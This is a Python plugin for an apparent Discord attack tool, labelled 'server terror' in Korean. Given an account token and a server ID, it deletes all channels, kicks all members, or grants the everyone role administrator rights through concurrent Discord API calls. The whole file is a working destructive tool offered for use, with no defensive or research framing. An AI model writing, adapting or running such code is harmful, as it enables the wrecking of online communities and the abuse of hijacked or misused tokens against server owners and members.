import asyncio
import importlib
from typing import Any

from colorama import Fore
import requests
from requests import HTTPError
import aiohttp

from utils.Plugin.PluginABC import PluginABC
from utils.Setting.setup_most import TokenValidator, heads


class GuildBomber(PluginABC):
    plugin_name = "서버 테러"

    @classmethod
    def get_option(cls) -> int:
        print("\n")
        print(f"[\x1b[95m1\x1b[95m\x1B[37m] 서버 모든 채널 삭제")
        print(f"[\x1b[95m2\x1b[95m\x1B[37m] 서버 모든 멤버 추방")
        print(f"[\x1b[95m3\x1b[95m\x1B[37m] 서버 모든 멤버 관리자 권한 획득")
        print("[\x1b[95m4\x1b[95m\x1B[37m] 나가기")

        option = int(input(f"[\x1b[95m>\x1b[95m\x1B[37m] 옵션: "))
        return option

    @classmethod
    def return_channels(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
        response = requests.get(url=url, headers=heads(token))
        channels: list[dict[str, Any]] = response.json()
        return channels

    @classmethod
    def return_members(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/members"
        response = requests.get(url=url, headers=heads(token))
        members: list[dict[str, Any]] = response.json()
        return members

    @classmethod
    def return_roles(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"
        response = requests.get(url=url, headers=heads(token))
        roles: list[dict[str, Any]] = response.json()
        return roles

    @classmethod
    async def delete_all_guild_channels(cls, token: str, channels: list[dict[str, Any]]):
        async def delete_guild_channel(channel: dict[str, Any]):
            url = f"https://discord.com/api/v10/channels/{channel['id']}"
            async with (aiohttp.ClientSession() as session,
                        session.delete(url=url, headers=heads(token)) as response):
                try:
                    response.raise_for_status()
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 삭제된 채널: {Fore.WHITE}{channel['id']}{Fore.RESET}")
                except HTTPError:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] 실패... 실패한 채널: {channel['id']}")

        await asyncio.gather(*(delete_guild_channel(channel=channel) for channel in channels))

    @classmethod
    async def remove_all_guild_members(cls, token: str, guild_id: str, members: list[dict[str, Any]]):
        async def remove_guild_member(member: dict[str, Any]):
            url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{member['user']['id']}"
            async with (aiohttp.ClientSession() as session,
                        session.delete(url=url, headers=heads(token)) as response):
                try:
                    response.raise_for_status()
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 삭제된 멤버: {Fore.WHITE}{member['user']['id']}{Fore.RESET}")
                except HTTPError:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] 실패... 실패한 멤버: {member['user']['id']}")

        await asyncio.gather(*(remove_guild_member(member=member) for member in members))

    @classmethod
    def make_all_members_administrator(cls, token: str, guild_id: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/roles/{guild_id}"
        data = {
            "permissions": "8"
        }
        response = requests.patch(url=url, json=data, headers=heads(token))
        try:
            response.raise_for_status()
        except HTTPError:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] 실패... 실패한 서버: {guild_id}")

    @classmethod
    async def main(cls):
        option = cls.get_option()

        if option <= 0 or 4 <= option:
            await importlib.import_module("main").Hydron()

        token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 토큰: ')
        await TokenValidator(token)
        guild_id = input(f"[\x1b[95m>\x1b[95m\x1B[37m] 서버 ID: ")

        if option == 1:
            channels = cls.return_channels(token=token, guild_id=guild_id)
            await cls.delete_all_guild_channels(token=token, channels=channels)
        elif option == 2:
            members = cls.return_members(token=token, guild_id=guild_id)
            await cls.remove_all_guild_members(token=token, guild_id=guild_id, members=members)
        elif option == 3:
            cls.make_all_members_administrator(token=token, guild_id=guild_id)

        input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
        await importlib.import_module("main").Hydron()
